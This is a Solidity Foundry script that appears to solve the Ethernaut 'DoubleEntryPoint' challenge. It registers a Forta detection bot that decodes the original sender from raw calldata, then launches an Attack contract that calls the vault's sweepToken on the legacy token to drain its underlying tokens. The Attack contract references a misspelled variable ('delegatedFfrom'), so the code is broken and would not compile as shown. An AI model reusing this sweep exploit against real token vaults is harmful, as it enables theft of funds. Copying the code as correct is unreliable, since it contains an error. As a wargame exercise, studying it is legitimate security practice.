//SPDX-License-Identifier :MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level26.sol";

contract Level26Sol is Script{

    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address cryptoVault = dep.cryptoVault();
        address player = dep.player();
        address delegatedFrom = dep.delegatedFrom();

        console.log("CryptoVault is ",cryptoVault);
        console.log("Player is ",player);
        console.log("LegacyToken is ",delegatedFrom);

        LegacyToken lgt = LegacyToken(delegatedFrom);
        CryptoVault cv = CryptoVault(cryptoVault);

        console.log("Balance of DET in CryptoVault", dep.balanceOf(cryptoVault));
        console.log("Balance of LGT in CryptoVault", lgt.balanceOf(cryptoVault));

        console.log("The following two address are same");
        console.log("Delegate of Legacytoken contract",address(lgt.delegate()));
        console.log("DET :", address(dep));

        Forta forta = dep.forta();


        //registering bot
        DetectionBot bot = new DetectionBot();
        forta.setDetectionBot(address(bot));

        console.log("BOT ALERTS Before  exploit :", forta.botRaisedAlerts(address(bot)));
        
        new Attack().exploit(); //reverted by bot when it tries to exploit

        console.log("Cryptovault balance of DET :", dep.balanceOf(cryptoVault));
        console.log("BOT alerts after exploit: ",forta.botRaisedAlerts(address(bot)));

        vm.stopBroadcast();

    }
}

contract Attack{

    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);
    address public cryptoVault = dep.cryptoVault();
    address public delegatedFrom = dep.delegatedFrom();

    function exploit() public {
        CryptoVault cv = CryptoVault(cryptoVault);
        cv.sweepToken(IERC20(delegatedFfrom));
    }
}

contract DetectionBot{
    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);
    address public  cryptoVault = dep.cryptoVault();

    function handleTransaction(address user, bytes calldata msgData)external{

        address origSender;
        assembly{
            origSender:=  calldataload(0xa8)
        }

        if(origSender == cryptoVault){
            Forta(msg.sender).raiseAlert(user);
        }
    }
}